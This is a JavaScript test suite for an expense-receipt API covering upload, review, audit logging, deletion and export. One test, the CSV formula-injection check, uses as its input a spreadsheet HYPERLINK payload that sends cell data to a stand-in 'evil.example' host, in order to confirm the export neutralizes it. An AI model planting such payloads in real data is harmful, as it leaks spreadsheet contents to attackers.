import request from "supertest";
import { app } from "../src/app.js";
import { ExpenseReceipt } from "../src/models/index.js";
import { authHeader, resetDb, signup } from "./testUtils.js";

beforeEach(resetDb);

async function makeReceipt(orgId, overrides = {}) {
  return ExpenseReceipt.create({
    orgId,
    originalFilename: "receipt.pdf",
    storagePath: "/tmp/does-not-matter.pdf",
    contentType: "application/pdf",
    status: "extracted",
    merchantName: "Blue Bottle Coffee",
    category: "Meals & Entertainment",
    amount: 4.95,
    overallConfidence: 0.95,
    ...overrides,
  });
}

async function orgId(token) {
  const res = await request(app).get("/api/auth/me").set(authHeader(token));
  return res.body.org_id;
}

test("upload rejects unsupported file type", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/expenses/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("hello"), { filename: "notes.txt", contentType: "text/plain" });
  expect(res.status).toBe(422);
});

test("upload requires a file", async () => {
  const token = await signup(app, request);
  const res = await request(app).post("/api/expenses/upload").set(authHeader(token));
  expect(res.status).toBe(422);
});

test("upload creates a queued receipt and lists it", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/expenses/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("%PDF-1.4 fake"), { filename: "receipt.pdf", contentType: "application/pdf" });
  expect(res.status).toBe(201);
  expect(res.body.status).toBe("queued");

  const listRes = await request(app).get("/api/expenses").set(authHeader(token));
  expect(listRes.status).toBe(200);
  expect(listRes.body.items.map((i) => i.id)).toContain(res.body.id);
  expect(listRes.body.categories).toContain("Travel");
});

test("list can filter by status and search by merchant", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeReceipt(org, { status: "needs_review", merchantName: "Coffee Shop" });
  await makeReceipt(org, { status: "approved", merchantName: "Office Depot" });

  const filtered = await request(app).get("/api/expenses?status=approved").set(authHeader(token));
  expect(filtered.body.items).toHaveLength(1);
  expect(filtered.body.items[0].merchant_name).toBe("Office Depot");

  const searched = await request(app).get("/api/expenses?q=coffee").set(authHeader(token));
  expect(searched.body.items).toHaveLength(1);
  expect(searched.body.items[0].merchant_name).toBe("Coffee Shop");
});

test("receipt correction writes audit log", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org);

  let res = await request(app)
    .patch(`/api/expenses/${receipt.id}`)
    .set(authHeader(token))
    .send({ merchant_name: "Blue Bottle Corrected" });
  expect(res.status).toBe(200);
  expect(res.body.merchant_name).toBe("Blue Bottle Corrected");

  res = await request(app).get(`/api/expenses/${receipt.id}/audit-log`).set(authHeader(token));
  const actions = res.body.map((e) => e.action);
  expect(actions).toContain("human_correction");
});

test("correcting a field that doesn't actually change the value writes no audit log entry", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org);

  await request(app)
    .patch(`/api/expenses/${receipt.id}`)
    .set(authHeader(token))
    .send({ merchant_name: receipt.merchantName });

  const res = await request(app).get(`/api/expenses/${receipt.id}/audit-log`).set(authHeader(token));
  expect(res.body.map((e) => e.action)).not.toContain("human_correction");
});

test("approve receipt", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org);

  const res = await request(app).post(`/api/expenses/${receipt.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("approved");
});

test("cannot approve a receipt still queued or processing", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org, { status: "queued" });

  const res = await request(app).post(`/api/expenses/${receipt.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(409);
});

test("reject receipt has no status restriction", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org, { status: "approved" });

  const res = await request(app).post(`/api/expenses/${receipt.id}/reject`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("rejected");
});

test("retrying a failed receipt re-queues it and clears the error message", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org, { status: "failed", errorMessage: "OCR failed: boom" });

  const res = await request(app).post(`/api/expenses/${receipt.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("queued");
  expect(res.body.error_message).toBe("");

  const auditRes = await request(app).get(`/api/expenses/${receipt.id}/audit-log`).set(authHeader(token));
  expect(auditRes.body.map((e) => e.action)).toContain("retry_requested");
});

test("cannot retry an already-approved receipt", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org, { status: "approved" });

  const res = await request(app).post(`/api/expenses/${receipt.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(409);

  await receipt.reload();
  expect(receipt.status).toBe("approved"); // untouched
});

test("deleting a receipt removes it from the list and detail views", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org);

  const res = await request(app).delete(`/api/expenses/${receipt.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.ok).toBe(true);

  const listRes = await request(app).get("/api/expenses").set(authHeader(token));
  expect(listRes.body.items.map((i) => i.id)).not.toContain(receipt.id);

  const detailRes = await request(app).get(`/api/expenses/${receipt.id}`).set(authHeader(token));
  expect(detailRes.status).toBe(404);
});

test("deleting a receipt is not blocked by its status -- e.g. an already-approved one", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org, { status: "approved" });

  const res = await request(app).delete(`/api/expenses/${receipt.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
});

test("deleting the same receipt twice, or one that never existed, 404s", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const receipt = await makeReceipt(org);

  await request(app).delete(`/api/expenses/${receipt.id}`).set(authHeader(token));
  const again = await request(app).delete(`/api/expenses/${receipt.id}`).set(authHeader(token));
  expect(again.status).toBe(404);

  const bogus = await request(app).delete("/api/expenses/not-a-real-id").set(authHeader(token));
  expect(bogus.status).toBe(404);
});

test("export csv", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeReceipt(org, { merchantName: "Acme Diner" });

  const res = await request(app).get("/api/export/expenses/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain("Acme Diner");
});

test("export csv neutralizes formula-injection payloads", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeReceipt(org, { merchantName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")' });

  const res = await request(app).get("/api/export/expenses/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect(res.text).not.toContain('"=HYPERLINK(');
});

test("export xlsx responds successfully", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeReceipt(org);

  const res = await request(app).get("/api/export/expenses/xlsx").set(authHeader(token));
  expect(res.status).toBe(200);
});
